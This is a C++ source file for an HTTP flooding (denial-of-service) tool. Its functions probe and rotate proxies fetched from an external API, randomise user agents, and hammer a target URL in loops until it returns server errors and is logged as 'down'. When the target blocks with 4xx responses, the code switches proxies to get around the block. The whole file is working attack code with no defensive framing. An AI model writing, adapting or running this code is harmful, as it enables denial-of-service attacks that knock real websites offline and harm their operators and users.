#include "spdlog/spdlog.h"

#include "http_gun.h"

#include "api_interface.h"
#include "target.hpp"
#include "utils.h"
#include "config.h"
#include "globals.h"

using namespace Attackers;

std::optional<Proxy> HTTPGun::ChoseProxy(const std::vector<Proxy> &proxies) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};

	SPDLOG_INFO("Probing proxies with {}", ProxyConfig::PROXY_PROBING);
	prober.SetTarget(ProxyConfig::PROXY_PROBING);
	for(auto proxy : proxies)
	{
		prober.SetProxy(proxy.first, proxy.second);
		UpdateHeaders(headers, proxy.first);
		prober.SetHeaders(headers);

		if(const auto respCode{prober.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(*respCode >= 200 && *respCode < 300)
			{
				return proxy;
			}
			SPDLOG_INFO("Proxy: {}@{} failed with code: {}", proxy.first, proxy.second, *respCode);
		}
		else
		{
			SPDLOG_INFO("Proxy: {}@{} failed", proxy.first, proxy.second);
		}
	}

	return {};
}

bool HTTPGun::SetValidProxy() noexcept
{
	Informator informer;
	size_t proxyTries{0};

	while(!m_currentTask.ShouldStop())
	{
		if(!informer.LoadNewData())
		{
			continue;
		}
		if(const auto proxies{informer.GetProxies()})
		{
			if(const auto proxy{ChoseProxy(*proxies)})
			{
				m_currentProxy = std::move(proxy);
				return true;
			}
			else
			{
				++proxyTries;
			}
		}
		if(proxyTries == ProxyConfig::PROXY_TRIES)
		{
			SPDLOG_WARN("Max proxy fetch tries reached, aborting");
			break;
		}
	}
	return false;
}

std::optional<CURI> HTTPGun::Aim(const CURI &uriToAttack) noexcept
{
	CURLLoader prober;
	Headers headers{CURLLoader::BASE_HEADERS};
	// Trying to break through without proxy
	headers["User-Agent"] = ChoseUseragent();
	prober.SetHeaders(headers);
	prober.SetTarget(uriToAttack.GetFullURI());

	Headers receivedHeaders;

	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS, &receivedHeaders)})
	{
		SPDLOG_INFO("Got: {} without proxy", *targetRespCode);
		if(*targetRespCode >= 200 && *targetRespCode < 400)
		{
			SPDLOG_INFO("Firing without proxy");

			if(*targetRespCode >= 300)
			{
				const std::string locationString{"Location"};
				if(receivedHeaders.find(locationString) !=
					std::end(receivedHeaders))
				{
					return CURI{receivedHeaders[locationString]};
				}
			}
			return CURI{uriToAttack.GetFullURI()};
		}
		else if(*targetRespCode >= 500)
		{
			return {};
		}
	}
	SPDLOG_INFO("Failed to check host without proxy");
	// Trying to aim with proxy
	if(!SetValidProxy())
	{
		return {};
	}

	UpdateHeaders(headers, m_currentProxy->first);
	prober.SetHeaders(headers);

	prober.SetProxy(m_currentProxy->first, m_currentProxy->second);

	if(const auto targetRespCode{prober.Ping(AttackerConfig::DISCOVER_TIMEOUT_SECONDS)}; 
		*targetRespCode >= 200 && *targetRespCode < 400)
	{
		std::cout << "Firing with proxy" << std::endl;
		return CURI{uriToAttack.GetFullURI()};
	}

	return {};
}

void HTTPGun::FireTillDead(const CURI &targetToKill) noexcept
{
	SPDLOG_INFO("Attacking {} without proxy", targetToKill);
	if(AttackWithNoProxy(targetToKill))
	{
		return;
	}

	if(!m_currentTask.ShouldStop())
	{
		SPDLOG_INFO("Attacking {} with proxy", targetToKill);
		AttackWithProxy(targetToKill);
	}
}

bool HTTPGun::AttackWithNoProxy(const CURI &targetToKill) noexcept
{
	Headers headers{CURLLoader::BASE_HEADERS};
	CURLLoader wrapper;

	size_t errorsCount{0};

	wrapper.SetTarget(targetToKill.GetFullURI());

	while(!m_currentTask.ShouldStop())
	{
		headers["User-Agent"] = ChoseUseragent();
		wrapper.SetHeaders(headers);

		if(const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)})
		{
			if(m_currentTask.ShouldStop())
			{
				break;
			}
			if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				SPDLOG_WARN("Too many errors emited on no proxy attack, retrying");
				return true;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				SPDLOG_WARN("Target {} is blocking non proxy requests, leaving", targetToKill);
				break;
			}
			else if(*respCode >= 500)
			{
				SPDLOG_INFO("Target: {} is probably down, looking for others", targetToKill);
				return true;
			}
		}
	}

	return false;
}

void HTTPGun::AttackWithProxy(const CURI &targetToKill) noexcept
{
	CURLLoader wrapper;
	Informator apiLoader;
	Headers headers{CURLLoader::BASE_HEADERS};

	wrapper.SetTarget(targetToKill.GetFullURI());

	while(!m_currentTask.ShouldStop())
	{
		// Setting proxies
		if(!SetValidProxy())
		{
			return;
		}

		// Attacking
		size_t errorsCount{0};
		for(size_t currentTry = 0; 
			currentTry < ProxyConfig::MAX_PROXY_ATTACKS; currentTry++)
		{
			UpdateHeaders(headers, m_currentProxy->first);
			wrapper.SetHeaders(headers);

			const auto respCode{wrapper.Ping(AttackerConfig::FIRE_TIMEOUT_SECONDS)};
			if(m_currentTask.ShouldStop())
			{
				return;
			}
			else if(!respCode && ++errorsCount > AttackerConfig::MAX_ATTACK_ERRORS_COUNT)
			{
				SPDLOG_INFO("Too many errors emited on proxy attack, trying other");
				return;
			}
			else if(*respCode >= 400 && *respCode < 500)
			{
				SPDLOG_INFO("Target {} is blocking current proxy, trying other", targetToKill);
				break;
			}
			else if(*respCode >= 500)
			{
				SPDLOG_INFO("Target: {} is down, looking for others", targetToKill);
				return;
			}
		}
		SPDLOG_WARN("Current proxy exhausted, looking for other");
	}
}
